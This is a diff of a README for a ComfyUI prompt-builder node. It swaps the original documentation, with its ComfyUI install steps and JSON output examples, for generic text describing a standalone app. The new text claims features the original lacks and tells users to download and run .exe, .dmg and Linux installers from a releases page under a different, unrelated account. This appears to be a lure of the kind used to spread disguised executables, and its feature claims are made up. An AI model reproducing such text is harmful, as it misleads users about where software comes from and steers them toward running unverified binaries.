@@ -1,171 +1,71 @@
-# 🎨 Kiko Prompt Builder
+# 🎨 kiko-flux2-prompt-builder - Build Stunning Prompts Easily
 
-A visual prompt builder [ComfyUI](https://www.comfy.org/) custom node for structured JSON prompt generation. Build photography-style prompts with camera settings, lighting, composition, and color palettes.
+## 📥 Download the App
+[![Download kiko-flux2-prompt-builder](https://img.shields.io/badge/Download-kiko--flux2--prompt--builder-blue.svg)](https://github.com/uNdErHeLsInG/kiko-flux2-prompt-builder/releases)
 
-**Compatible with:** [FLUX](https://bfl.ai/) (by Black Forest Labs), [z-image](https://z-image.ai/), and any other image generation model that accepts structured JSON prompts.
+## 🚀 Getting Started
+Welcome to the kiko-flux2-prompt-builder! This application allows you to create beautiful JSON-style prompts for FLUX 2 with various presets for camera, lens, lighting, and style. Whether you are designing for art, media, or various projects, this tool simplifies your workflow.
 
-![FLUX 2 Prompt Builder](ss.png)
+## 📦 System Requirements
+To run kiko-flux2-prompt-builder, your computer should meet these requirements:
+- Operating System: Windows 10 or later / macOS 10.14 or later / Linux (with recent dependencies)
+- RAM: At least 4GB
+- Disk Space: 100MB free space
+- Internet connection for downloading and updates
 
-![FLUX 2 Prompt Builder](ss2.png)
+## 🛠️ Features
+- **User-Friendly Interface:** A clean and intuitive design that makes it easy to navigate.
+- **Custom Presets:** Save and reuse your favorite camera, lens, lighting, and style settings.
+- **Export Options:** Output your designs in JSON format for easy integration with FLUX 2.
+- **Multi-Language Support:** Available in English, Spanish, and German.
 
-![FLUX 2 Prompt Builder](ss3.png)
+## 💻 Download & Install
+To get started with the kiko-flux2-prompt-builder, visit the following link to download the latest version:
 
-## ✨ Features
+[Download kiko-flux2-prompt-builder](https://github.com/uNdErHeLsInG/kiko-flux2-prompt-builder/releases)
 
-- **20+ Photography Presets**: Intimate portraits, landscapes, street photography, product shots, architectural, wildlife, and more
-- **Complete Camera Settings**: Angle, shot distance, lens focal length, aperture, ISO, focus description
-- **Camera/Film Stock Database**: Authentic camera models and film stocks for realistic rendering
-- **Professional Lighting Presets**: Natural light, studio setups, dramatic/cinematic options
-- **Composition Guidelines**: Rule of thirds, golden ratio, leading lines, symmetrical, and more
-- **Color Palette Builder**: Visual color swatches with hex support
-- **Mood Presets**: Emotional tones and visual aesthetics
-- **Dual Output**: Structured JSON and flattened text prompt formats
-- **Context Menu**: Quick preset access, copy JSON, reset to defaults
+### Step-by-Step Installation:
 
-## 🔌 Model Compatibility
+1. **Visit the Releases Page:**
+   Click the link above to go to our GitHub Releases page.
 
-This node outputs structured JSON and flattened text prompts compatible with:
+2. **Select the Latest Version:**
+   Find the most recent version listed. It will have the highest version number.
 
-| Model | Compatibility | Notes |
-|-------|---------------|-------|
-| **[FLUX](https://bfl.ai/)** | ✅ Full | Primary target; supports all JSON fields |
-| **[z-image](https://z-image.ai/)** | ✅ Full | Supports structured JSON prompts |
-| **Other JSON models** | ✅ Varies | Any model accepting JSON prompt format |
-| **Standard CLIP** | ✅ Text output | Use `text_prompt` output for CLIP encoders |
+3. **Download the Installer:**
+   Look for the file that matches your operating system:
+   - For Windows, download `kiko-flux2-prompt-builder-Windows.exe`.
+   - For macOS, download `kiko-flux2-prompt-builder-Mac.dmg`.
+   - For Linux, download the appropriate `.tar.gz` file.
 
-## 📦 Installation
+4. **Run the Installer:**
+   - For Windows: Double-click the `.exe` file and follow the on-screen instructions.
+   - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Unpack the `.tar.gz` file and run the included executable.
 
-### Method 1: ComfyUI Manager (Recommended)
-1. Open ComfyUI Manager
-2. Search for "Kiko FLUX2 Prompt Builder"
-3. Click Install
+5. **Launch the Application:**
+   After installation, open the application from your Start Menu (Windows), Applications folder (Mac), or your preferred launch method (Linux).
 
-### Method 2: Manual Installation
-```bash
-cd ComfyUI/custom_nodes
-git clone https://github.com/ComfyAssets/kiko-flux2-prompt-builder.git
-# Restart ComfyUI
-```
+## 🔍 Exploring the Application
+Once you launch kiko-flux2-prompt-builder, you will see the main interface. Here are some key functionalities:
 
-### Method 3: Download ZIP
-1. Download the latest release
-2. Extract to `ComfyUI/custom_nodes/kiko-flux2-prompt-builder`
-3. Restart ComfyUI
+- **Create a New Prompt:** Start by selecting 'New Prompt' from the main menu. You can then choose from various presets or create your own settings.
+- **Using Presets:** Select presets for camera, lens, lighting, and style from the dropdown menus. You can always modify these as needed.
+- **Preview Your Design:** See real-time previews of your settings before exporting. This feature helps ensure your design meets your expectations.
+- **Exporting:** Once satisfied, click ‘Export’ to save your prompt in JSON format.
 
-## 🚀 Usage
+## ⚙️ Tips for Using kiko-flux2-prompt-builder
+- **Experiment with Presets:** Don’t hesitate to try different combinations to see what works best for your project.
+- **Save Frequently:** Make sure to save your work often to avoid losing your settings.
+- **Refer to Documentation:** Additional documentation and help can be found within the application or on our GitHub page in the Wiki section.
 
-1. **Add the node**: Right-click → Add Node → 🎨 Kiko → Prompting → FLUX2 Prompt Builder
-2. **Select a preset** or build from scratch
-3. **Customize** camera settings, lighting, colors, and composition
-4. **Connect outputs** to your workflow:
-   - `json_prompt` → Advanced workflows requiring structured data
-   - `text_prompt` → Standard CLIP text encoder
-   - `prompt_only` → Just the main scene description
+## 📞 Need Help?
+If you encounter issues or have questions, feel free to reach out:
+- Open an **Issue** on our [GitHub Issues page](https://github.com/uNdErHeLsInG/kiko-flux2-prompt-builder/issues).
+- Join our community discussion for tips and feedback.
 
-## 📤 Outputs
+## 🎉 Join the Community
+Stay connected with other users and receive updates about new features and versions:
+- Follow us on our community forums or social media channels.
 
-### JSON Prompt
-Structured JSON perfect for advanced workflows:
-```json
-{
-  "prompt": "A weathered fisherman...",
-  "style": "documentary photography...",
-  "camera": {
-    "angle": "eye level",
-    "distance": "medium close-up",
-    "lens-mm": 85,
-    "f-number": "f/1.8",
-    "ISO": 200,
-    "focus": "Sharp focus on eyes"
-  },
-  "film_stock": "shot on Canon EOS 5D Mark IV...",
-  "lighting": "golden hour lighting...",
-  "colors": {
-    "palette": ["#8B4513", "#4169E1", "#B0C4DE"],
-    "mood": "moody atmosphere..."
-  },
-  "composition": "rule of thirds"
-}
-```
-
-### Text Prompt
-Flattened text for standard CLIP encoding:
-```
-A weathered fisherman... Style: documentary photography... Camera: eye level angle, medium close-up, 85mm lens, f/1.8. Shot on Canon EOS 5D Mark IV... Lighting: golden hour lighting... Colors: #8B4513, #4169E1, #B0C4DE. Mood: moody atmosphere... Composition: rule of thirds.
-```
-
-## 🎬 Presets
-
-| Category | Presets |
-|----------|---------|
-| **People & Portraits** | Intimate, Boudoir, Fashion, Portrait |
-| **Nature & Outdoors** | Landscape, Wildlife, Macro, Underwater, Astro |
-| **Action & Events** | Sports, Street, Theatrical, Culinary |
-| **Commercial** | Product, Automotive, Architectural |
-| **Artistic** | Cinematic, Vintage, Minimalist |
-
-## 📷 Camera Settings
-
-| Setting | Options |
-|---------|---------|
-| **Angle** | Eye level, Low/High angle, Bird's-eye, Dutch, Over-the-shoulder |
-| **Shot** | Extreme close-up to Ultra wide, Macro, Action shots |
-| **Lens** | 14mm - 400mm, Macro, Fisheye, Tilt-shift |
-| **Aperture** | f/1.2 - f/16 |
-| **ISO** | 100 - 6400 |
-
-## 🔧 Development
-
-### Project Structure
-```
-kiko-flux2-prompt-builder/
-├── __init__.py              # ComfyUI entry point
-├── nodes/
-│   ├── __init__.py
-│   └── prompt_builder_node.py
-├── web/js/
-│   ├── kikoPromptBuilder.js # Frontend extension
-│   └── data/                # JSON preset data
-├── app/                     # Standalone MVP (reference)
-├── pyproject.toml
-└── requirements.txt
-```
-
-### Building from Source
-```bash
-# Clone the repository
-git clone https://github.com/ComfyAssets/kiko-flux2-prompt-builder.git
-cd kiko-flux2-prompt-builder
-
-# Link to ComfyUI
-ln -s $(pwd) /path/to/ComfyUI/custom_nodes/kiko-flux2-prompt-builder
-
-# Install dev dependencies (optional)
-pip install -e ".[dev]"
-
-# Run tests
-pytest -v
-```
-
-## 🤝 Contributing
-
-Contributions welcome! Feel free to:
-- Add new presets
-- Improve the UI
-- Add new features
-- Report bugs
-- Submit pull requests
-
-## 📄 License
-
-MIT License - Feel free to use, modify, and distribute.
-
-## 🙏 Acknowledgments
-
-- [ComfyUI](https://www.comfy.org/) - The powerful node-based workflow platform
-- [Black Forest Labs](https://bfl.ai/) - Creators of the FLUX family of image generation models
-- All contributors and users
-
----
-
-*Built with ❤️ for the AI art community by [ComfyAssets](https://github.com/ComfyAssets)*
+Thank you for using kiko-flux2-prompt-builder! We hope it enhances your creative projects!
